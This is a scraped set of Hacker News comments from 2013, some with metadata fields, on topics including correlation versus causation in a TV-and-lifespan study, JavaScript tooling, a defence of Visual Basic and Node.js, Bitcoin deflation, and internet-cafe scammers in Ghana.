It would be some gnarly math to figure out how to make the storage reliable, since clients could arbitrarily connect and disconnect at any time (carrying a portion of your data with it). I suppose it would be an algorithm similar to RAID, except that there would be an algorithm that would detect damage, such as not enough backups online for a certain time, and the risk the data would no longer be available, and then in response create another RAID node.<p>Bandwidth could be an issue, too. Maybe clients could get bandwidth and storage karma, if they accept a lot of data from other users and a lot of changes to that data.<p>Interesting idea, anyway.<p>Edit: maybe you could even sell your processing power for karma, too.

5777029,comment,5776717,5776924,7,0,saurik,,,"This LA Times article, like every article that you ever see discussing any of these results, describes a causation: ""sitting cuts about 22 minutes from their life span"". None of these ""studies"" were ""experiments"" that are capable of demonstrating causation: they are either cohort studies or surveys, and are only able to demonstrate correlation.<p>In this case, ""The authors constructed a life table model that incorporates a previously reported mortality risk associated with TV time. Data were from the Australian Bureau of Statistics and the Australian Diabetes, Obesity and Lifestyle Study, a national population-based observational survey that started in 19992000. The authors modelled impacts of changes in population average TV viewing time on life expectancy at birth.""<p>We thereby have to ask, what is the more likely explanation: that sitting causes your life span to decrease, or that the same things that cause your life span to decrease make sitting, or watching television, something you do more often? We aren't doing experiments where we assign people into groups, one which will sit for most of their life and one which will stand/walk, so we can't assume the causation.<p>Maybe you don't have any friends, and maybe that is why you sit inside all day watching the television. Some people believe being a social outcast directly leads to health issues, but one could also point out that friends often are the people who goad you into seeing the doctor for that thing you never cared enough about, or are quite literally the people who pick you up when you fall, maybe calling 911.<p>Alternatively, it could be that your life really sucks, and you need the outlet of watching television to make your life feel more reasonable. Things that cause peoples' lives to suck might be abusive relationships, chronic illness, or stressful jobs (and other studies, I believe even real experiments, and I even further believe demonstrated mechanisms, show that stress leads to health problems).<p>Some might argue ""it is easy to control for people who are dying and remove them from your study"", but it is very difficult to control for subtle effects, and we are talking about a subtle effect here. This is especially true once you look into compliance effects: people who don't sit around all day watching television are probably also the kinds of people who visit the dentist regularly, or simply eat better food.<p>The result of this mistake is that it could even be <i>dangerous</i> to be making claims that sitting reduces your lifespan: maybe by telling the people who are sitting around watching television that its unhealthy for them (again, based on no direct evidence) causes them to now feel bad about watching television, increasing their stress, or even causes them to push themselves even further to exercise, when they were sitting down because their knee was already giving out.<p>A lot of people, at this point, get angry at shoddy science reporting. That's a real problem: articles like this blow studies that are correlations into causations. The result is that people hear every couple years opposing information on some debates they care about (such as whether something like wine or aspirin is ""good for your heart""), and eventually decide ""it isn't like scientists know anything"" and ""give it a year, we'll learn something new"", something they then apply to other branches of science (like evolution).<p>But, frankly: the scientists who are publishing these papers really need to use less ambiguous wording--especially if they are not going to be really proactive reaching out to press to be involved in the writing of the articles, making certain the right kinds of hedges get quoted by the reporters (which may scuttle the article, as maybe it is no longer interesting to them: in comparison to bad information spreading, less reporting should be a positive thing)--as I think they are complicit in the confusion.<p>This paper uses wording that technically doesn't imply a correlation if you know what all of the words mean and you are careful with your reading, but to any normal person they are quite clearly saying ""X causes Y"": ""The amount of TV viewed in Australia in 2008 reduced life expectancy at birth by 1.8 years (95% uncertainty interval (UI): 8.4 days to 3.7 years) for men and 1.5 years (95% UI: 6.8 days to 3.1 years) for women..."".<p>When I read that, I know that that just means ""if I'm building a probability distribution over the life expectancy of a person (who would be similar to the people studied, potentially including 'having not heard about this study') and I know how much TV they watch I can use that information to adjust my expectation based on this metric, as established by this well-founded study"". However, ""X reduced life expectancy"" to normal people means ""if I do X it will reduce my life expectancy, and if I avoid X, I can avoid that effect"".<p>:(",1369695059

You won't see a Web-based Mathematica rewritten by hand in HTML/JS/etc. You will see Emscripten-compiled 3DS Max (see my blog on OTOY for more). The reasons behind these outcomes should be clear. They have little to do with JS lacking Java's big-OO features.<p>I am actually not defending big-OO features (I think, 90s style big-OO is obsolete). I like mix of OO and functional programming and like the results which it confers to code (see for example, Reactive Extensions, it's very easy to learn, expressive, and compact). The feature which I miss in JavaScript and which platforms such as JVM and .NET have, is ease of maintaining code, mainly through sound type system and languages created with tooling in mind.<p>>* Glad you brought up refactoring. It is doable in JS IDEs with modern, aggressive static analysis. See not only TypeScript but also Marijn Haverbeke's Tern and work by Ben Livshits, et al., at MSR.<p>The problem with algorithms similar to Tern's is that it works well until we use reflexive capabilities of the language. However, most of the libraries do use them, and as long as it happens, algorithms such as Tern's infer useless type Object.<p>>But automated refactoring is not as much in demand among Web developers I know, who do it by hand and who in general avoid the big-OO ""Kingdom of Nouns"" approach that motivates auto-refactoring.<p>There are refactoring which can be useful in any language. My favorite one is rename, I usually can't come up with a good name from a first attempt. Others are extract/inline method (extract/inline variable is easy to implement in JavaScript).<p>Another maintainability related feature is navigation to definition and find usages. Unfortunately, language dynamism makes them imprecise and code maintenance becomes nightmare especially if you have > 30 KLOCs of code. You have to recheck everything manually and it's very error prone. Tests can help, but they also require substantial effort.",1369694389

5776976,comment,5775880,5776071,6,0,ilaksh,,,"I'm 35.  I started learning SQL, C, C++, memory management etc. many years ago when I was a teenager.<p>However, and I know that people will take the opportunity to disrespect me for this, but I realized, after playing around with 3d C++ graphics in college, that I wanted to build interactive desktop applications quickly.  So I learned to use a very powerful tool called Visual Basic 6.  Not because I didn't understand memory management or anything else, but because it was a better software engineering decision for most projects since it allowed me to not repeat solving the same problems that had already been solved.<p>I know people aren't going to be able to understand this because of the reputation that Visual Basic has, and they will lose respect for me, but I am going to go ahead and say it anyway.  Visual Basic 6 was and still is a better software engineering tool than C++.  Why?  One of the core principles of software engineering is DRY.  Manual memory management means you are repeating yourself.  It also means you are doing the memory management yourself rather than letting the computer do it for you.  Another reason why Visual Basic 6 is superior software engineering over C or C++ is the component models.<p>I eventually moved on to .NET and C# because of the stigma of VB and also because the new frameworks provided better tools.<p>Eventually I realized that the closed source world of desktop Microsoft development was outdated since it was tied to one platform and old-fashioned business models.  So I moved into web development.  The most practical tool for web development was PHP.  It was the best software engineering decision to select PHP to build a web application.  Because it allowed me to avoid solving the same problems that many other engineers had already been faced with and solved on their own.  Something that many software engineers don't understand is that not only is it important not to repeat yourself in your own code, but not to repeat solving the same problems other people have already solved for you.<p>So then I wanted to build a realtime interactive collaborative software application in the web browser.  Because that is the most compelling, useful, and challenging type of application.  So I tried to do it with PHP.  Very awkward.  I tried to use another popular server-side tool, Python.  Again it turned out to be very awkward to do realtime collaborative software applications with Python (using things like Twisted).<p>So when I heard about this thing called Node.js that was built from the ground up to take full advantage of the single-threaded but asynchronous programming model of JavaScript as well as powerful underlying evented non-blocking I/O C libraries, I had to try it.  Guess what?  All of that software engineering done by the people who wrote those C libraries and the people who put together JavaScript and Node means that there are a lot of problems that I don't have to solve to write performant IO-intensive code on the back end!  Continuation-based programming in JavaScript and Node.js just works better and is more maintainable (less code and less complexity) than the other solutions.<p>So I'm sorry, but if you're not adopting new programming languages, tools and frameworks, then I don't think you are a good software engineer.  Because good software engineers only solve the problems that they have to, and don't continue to solve the same problems over and over.<p>Now -- NoSQL.  So, it turns out that NONE of the many software applications I built over the years using Oracle, SQL Server or MySQL actually required 'real' db-level transactions or even involved very large datasets.  And I believe that is the case for most programmers (not all of course).  These days that is still true.  Also, these days I only code in JavaScript (mostly CoffeeScript really).  So when I heard about things like MongoDB that allowed me to store JSON directly, skip the object relational layer, and not even have to define a schema ahead of time, I had to seriously consider whether I needed a normalized relational database, SQL, to constantly \nreiterate joins, etc.  When you examine it logically, it turns out that we were actually doing all of those things just because THAT WAS HOW YOU DID IT.  With the current ecosystem of JavaScript and JSON, it is BAD SOFTWARE ENGINEERING for the MAJORITY of software projects to use a relational database, joins, etc.  Why is it bad software engineering?  Because you are creating a bunch of problems for yourself that you wouldn't have if you used a different set of tools.",1369694161

5776966,comment,5771046,5774449,1,0,fancyketchup,,,"> In a transaction where one asset is inflationary in relation to another...<p>Yes, and this happens in the real world.  You'll find that when an asset is deflationary (ie, its price in USD is increasing), buyers try to delay payment so they can hold onto their dollars for longer.  The asset being deflationary is exactly the same thing as the currency being inflationary (in this simply two-component system): In the future the asset is worth more and dollars are worth less, so to get the best deal you want to pay with the least valuable dollars, which are future ones.<p>> Another argument...<p>Depends on the level of deflation and your expectations for the future.  If Bitcoin replaced the world's currencies, it should be worth ""a few"" (handwavey order of magnitude) million USD per BTC[1].  Even if it just replaced the USD it would be worth hundreds of thousands of today's USD.  And that assumes that all 21 million bitcoins are available for use in the economy.  It is currently trading at about one hundred USD per BTC.  Are you seriously telling me that you would trade a Bitcoin for a few cases of good beer right now and give up millions in future value?  If Satoshi is holding on to orginal bitcoins right now he'd be stupid to spend them not because someone could blackmail him, but because he could be a multi-trillionare in a couple decades.<p>Let me put this another way: If bitcoin ""only"" deflated at 10% per year (the number you picked for beer), it would take around a <i>century</i> (100 years) to deflate enough to replace the world's currencies.  You'd probably be dead before it's big enough to replace just the dollar.  And 10% is huge.  Imagine if we had 10%/yr inflation for a century.  Would that be a good thing?  Do you think 10% inflation could be maintained for that long without a vicious circle causing hyperinflation?<p>>  Third argument: even if everyone is holding their money, what's the problem?<p>Because this amplifies the vicious cycle.  Hoarding money pulls it out of the economy, which increases deflation.  That makes people want to hoard their money.  Which pulls it out of the economy, which...<p>> The minute someone needs something, they'd have to pay for it. They would prefer to consume less if cash appreciates and consume more if cash depreciates. But there is no magical threshold after which money becomes so expensive that everyone stupidly dies of starvation.<p>So this is interesting: It works fine if we pretend that our amplifier is relatively linear and has a healthy amount of negative feedback and plenty of phase margin.  Unfortunately, things in the real world aren't quite so simple.  What happens when all the farmers decide not to plant crops (or not beyond a sustenance level) one year because each one knows that he will be better off saving his money to buy seeds next year?  Futures markets can help with this a little, but those are prone to bubbles, too. By the time the price signal trickles back through the feedback loop you already have people starving. Google for the MIT beer game.  Oscillations ""shouldn't"" happen in that system, yet they do.  The cause of the oscillations in the MIT beer game is delay in the feedback network.  It's directly analogous to an op-amp circuit.<p>So, bitcoin <i>might</i> work in a soviet-style, centrally planned economy, where someone with a bird's-eye view can dictate the output of various industries.  Maybe bitcoiners want central planning.  I don't know.  But, know that <i>I</i> would prefer not to have that.<p>[1] It was a while ago, but I calculated the approximate world money supply using numbers I found on wikipedia.  It's something like the equivalent value of tens of trillions of USD (trillion=1e12), and there are at most tens of millions of bitcoins (million=1e6).  1e13/1e7 ~= 1e6.  This is a very very rough estimate, but it shows that the current value of bitcoin isn't even close to being in the same county as the ballpark compared to what it needs to be to reach its apparent goals (world domination).  If you really think that bitcoin is going to replace USD, buy as many as you can get your hands on for whatever price anyone asks because you're buying them for fractions of a penny on the dollar.

The hospital staff had a hard time wrapping their heads around the idea _lying on your back is painful_ for someone in labor.  The human body hasn't changed, but the medical practices are currently optimized around the assumption of an epidural and keeping to a schedule.  Doctors who have let this assumption ossify will force the hands of patients who simply don't know otherwise.<p>- My pediatrician's practice currently recommends avoiding peanut butter until age... three?  I think.

If you use a pseudonym and hide your contact info or otherwise put up barriers to being contacted, you'll lose opportunities.<p>Aside from that, one the best ways to get recruited is to show up at tech conferences and engage with the other participants.

I wonder how that changes the way they'll use internet access.<p>Speaking of how society uses the internet, I traveled through Ghana for four weeks last year and I heard that one of the reasons internet cafes aren't really wanted in smaller towns in Ghana is that people worried about it corrupting their youth, and not in the way you think: they worry about their children getting involved with the 419'ers[1].<p>And I must admit, I did see a lot of scammers in the smaller cafes, mostly teenage boys, often a few of them working together. Once I even witnessed a really well organised romance scam[2]: some would be setting up fake dating profiles, looking for pretty pictures of scantilly clad African women, some would be chatting with unsuspecting victims, pretending to be some kind of mail-order African bride (who sadly had a broken webcam), discussing how best to bait the victim, and there actually was a guy ""managing"" the whole group. It was crazy how coordinated the whole effort was.<p>Before this gets misinterpreted: I'm not saying you can't trust Africans who are online, obviously - most of them will be people with a higher education and internet at home or the university. I guess the problem with these small internet cafes is that the most likely early adopters are these 419'ers.<p>Anyway, I wonder how getting internet access to everyone will impact all of this. Maybe it will force the local governments to really start taking the problem seriously.<p>[1] <a href=""http://en.wikipedia.org/wiki/Nigerian_scam"" rel=""nofollow"">http://en.wikipedia.org/wiki/Nigerian_scam</a><p>[2] <a href=""http://en.wikipedia.org/wiki/Romance_scam"" rel=""nofollow"">http://en.wikipedia.org/wiki/Romance_scam</a>",1369692385

So you convince yourself that you only need to implement 20% of the features, and you can still sell 80% as many copies.<p>Unfortunately, it's never the same 20%. Everybody uses a different set of features. In the last 10 years I have probably heard of dozens of companies who, determined not to learn from each other, tried to release ""lite"" word processors that only implement 20% of the features. This story is as old as the PC. Most of the time, what happens is that they give their program to a journalist to review, and the journalist reviews it by writing their review using the new word processor, and then the journalist tries to find the ""word count"" feature which they need because most journalists have precise word count requirements, and it's not there, because it's in the ""80% that nobody uses,"" and the journalist ends up writing a story that attempts to claim simultaneously that lite programs are good, bloat is bad, and I can't use this damn thing 'cause it won't count my words. If I had a dollar for every time this has happened I would be very happy.<p>When you start marketing your ""lite"" product, and you tell people, ""hey, it's lite, only 1MB,"" they tend to be very happy, then they ask you if it has their crucial feature, and it doesn't, so they don't buy your product.</i><p>Wordpress seems to have everyone's critical feature, or critical plug-in, or a developer intimately familiar with the platform who can be hired to write your critical plug-in.
